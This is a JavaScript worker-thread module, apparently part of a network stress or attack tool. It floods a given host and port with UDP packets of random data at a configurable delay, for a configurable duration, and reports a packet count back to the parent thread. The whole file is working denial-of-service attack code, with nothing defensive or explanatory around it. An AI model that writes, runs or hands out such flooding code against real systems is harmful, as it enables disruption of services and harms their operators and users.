import { parentPort, workerData } from "worker_threads";
import dgram from "dgram";
import { randomString } from "../utils/randomUtils.js";

const startAttack = () => {
    const { target, duration, packetDelay, packetSize } = workerData;

    const [targetHost, targetPort] = target.split(":");
    const port = parseInt(targetPort, 10);

    if (isNaN(port)) throw new Error("Invalid port: Should be a number");
    if (port < 1 || port > 65535) throw new Error("Invalid port: Should be between 1 and 65535");

    const socket = dgram.createSocket("udp4");
    let totalPackets = 0;
    const startTime = Date.now();

    const sendPacket = () => {
        const elapsedTime = (Date.now() - startTime) / 1000;
        if (elapsedTime >= duration) {
            socket.close();
            parentPort.postMessage({ log: "Attack finished", totalPackets });
            process.exit(0);
        }

        const message = randomString(packetSize);
        socket.send(message, port, targetHost, (err) => {
            if (err) {
                parentPort.postMessage({
                    log: `❌ Packet failed to ${targetHost}:${port}: ${err.message}`,
                    totalPackets,
                });
            } else {
                totalPackets++;
                parentPort.postMessage({
                    log: `✅ Packet sent to ${targetHost}:${port}`,
                    totalPackets,
                });
            }
        });
    };

    setInterval(sendPacket, packetDelay);
};

if (workerData) {
    startAttack();
}
